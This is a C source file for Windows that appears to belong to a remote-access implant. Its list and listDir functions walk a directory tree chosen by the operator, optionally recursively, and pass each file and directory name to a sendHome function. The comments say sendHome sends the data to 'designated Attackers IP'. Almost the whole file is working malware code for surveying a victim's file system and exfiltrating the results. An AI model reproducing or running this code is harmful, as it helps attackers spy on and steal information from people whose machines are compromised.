#include "config.h"

int list()
{
	TCHAR buff[MAX_PATH], input[MAX_PATH], recursive[2], files[2];
	int pathIndex = 0;

	//Get path from user to get contents of.
	_tprintf(TEXT("List from (Path): "));
	_getts_s(input, MAX_PATH);

	//Get user input to check whether to recursively
	//look in directories within user selected path.
	_tprintf(TEXT("Recursive? (Y/N): "));
	_getts_s(recursive, 2);

	//Get user input to check if you want to list files
	//along with directeries within user slected path.
	_tprintf(TEXT("List files? (Y/N): "));
	_getts_s(files, 2);

	_tprintf(TEXT("\n"));

	//If the user inputs an ENV variable within their selected path
	//it will get expanded into its full path within their input.
	if (!ExpandEnvironmentStrings(input, buff, MAX_PATH))
	{
		_tprintf(_T("ERROR: ExpandEnvironmentStrings function call."));
		return 1;
	}

	//Lists contents of directory input by user.
	if (listDir(buff, files, recursive, -1))
	{
		_tprintf(_T("ERROR: listDir function call."));
		return 1;
	}

	_tprintf(TEXT("\n"));

	return 0;
}

int listDir(STRSAFE_LPCWSTR path, STRSAFE_LPCWSTR files, STRSAFE_LPCWSTR recursive, int level)
{
	char string[256];
	size_t sizeConverted;
	TCHAR pathArr[MAX_PATH], buff[MAX_PATH], temp[256];
	WIN32_FIND_DATA findData;
	HANDLE handle = INVALID_HANDLE_VALUE;
	level++;

	//Copy user input path into a TCHAR array and concat a wildcard
	//to itfor all the files within the chosen directory to be read.
	StringCchCopy(pathArr, MAX_PATH, path);
	StringCchCat(pathArr, MAX_PATH, TEXT("\\*"));

	//Find first file within user selected directory.
	handle = FindFirstFile(pathArr, &findData);

	//Keep iterating files within the user selected directory.
	do 
	{
		//Check whether you found a file or a directory.
		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			//If a directory is detected ignore "." and "..", they're redundant.
			if (_tcscmp(findData.cFileName, TEXT(".")) && _tcscmp(findData.cFileName, TEXT("..")))
			{
				//Add a tab to the output for a visual representation
				//of what level of deppth you are in within the directory.
				for (int i = 0; i < level; i++)
				{
					_stprintf_s(temp, 256, TEXT("\t"));

					//Convert TCHAR to char buffer.
					if (wcstombs_s(&sizeConverted, string, 256, temp, 256))
					{
						_tprintf(_T("ERROR: wcstombs_s function call failed."));
						return 1;
					}
					
					//Sends tab data to sendHome function 
					//to be sent to designated Attackers IP. 
					if (sendHome(string, 0))
					{
						_tprintf(_T("ERROR: sendHome function call failed."));
						return 1;
					}
				}

				_stprintf_s(temp, 256, TEXT("%s - [Dir]\n"), findData.cFileName);

				//Convert TCHAR to char buffer.
				if (wcstombs_s(&sizeConverted, string, 256, temp, 256))
				{
					_tprintf(_T("ERROR: wcstombs_s function call failed."));
					return 1;
				}

				//Sends directory data to sendHome function 
				//to be sent to designated Attackers IP. 
				if (sendHome(string, 0))
				{
					_tprintf(_T("ERROR: sendHome function call failed."));
					return 1;
				}

				StringCchCopy(buff, MAX_PATH, path);
				StringCchCat(buff, MAX_PATH, TEXT("\\"));
				StringCchCat(buff, MAX_PATH, findData.cFileName);

				//If the user selected to recursively list the contents 
				//of directories call this function recursively.
				if (!_tcscmp(recursive, TEXT("Y")) || !_tcscmp(recursive, TEXT("y")))
				{
					if (listDir(buff, files, recursive, level))
					{
						_tprintf(_T("ERROR: listDir function call failed. Level %d"), level);
						return 1;
					}
				}
			}
		}
		else if (!_tcscmp(files, TEXT("Y")) || !_tcscmp(files, TEXT("y")))
		{
			//Add a tab to the output for a visual representation
			//of what level of deppth you are in within the directory.
			for (int i = 0; i < level; i++)
			{
				_stprintf_s(temp, 256, TEXT("\t"));

				//Convert TCHAR to char buffer.
				if (wcstombs_s(&sizeConverted, string, 256, temp, 256))
				{
					_tprintf(_T("ERROR: wcstombs_s function call failed."));
					return 1;
				}

				//Sends tab data to sendHome function 
				//to be sent to designated Attackers IP. 
				if (sendHome(string, 0))
				{
					_tprintf(_T("ERROR: sendHome function call failed."));
					return 1;
				}
			}
			
			_stprintf_s(temp, 256, TEXT("%s \n"), findData.cFileName);

			//Convert TCHAR to char buffer.
			if (wcstombs_s(&sizeConverted, string, 256, temp, 256))
			{
				_tprintf(_T("ERROR: wcstombs_s function call failed."));
				return 1;
			}

			//Sends directory data to sendHome function 
			//to be sent to designated Attackers IP. 
			if (sendHome(string, 0))
			{
				_tprintf(_T("ERROR: sendHome function call failed."));
				return 1;
			}
		}
	//Keep iterating through files as long as they're available.
	} while (FindNextFile(handle, &findData) != 0);

	//Close handle.
	if (!FindClose(handle))
	{
		_tprintf(_T("ERROR: FindClose function call failed."));
		return 1;
	}

	return 0;
}
